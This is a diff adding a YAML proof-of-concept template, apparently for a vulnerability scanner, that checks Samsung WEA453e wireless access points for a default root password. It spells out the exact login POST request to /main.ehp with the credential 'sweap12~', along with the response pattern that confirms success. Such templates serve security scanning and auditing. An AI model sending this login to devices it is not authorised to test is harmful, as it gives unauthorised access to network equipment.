@@ -1,0 +1,18 @@
+name: poc-yaml-samsung-wea453e-default-pwd
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /main.ehp
+            body: |
+                httpd;General;lang=en&login_id=root&login_pw=sweap12~
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes("document.formParent2.changepasswd1.value")) && response.body.bcontains(bytes("passwd_change.ehp"))
+expression: r0()
+detail:
+    author: sharecast
+    links:
+        - https://iryl.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/
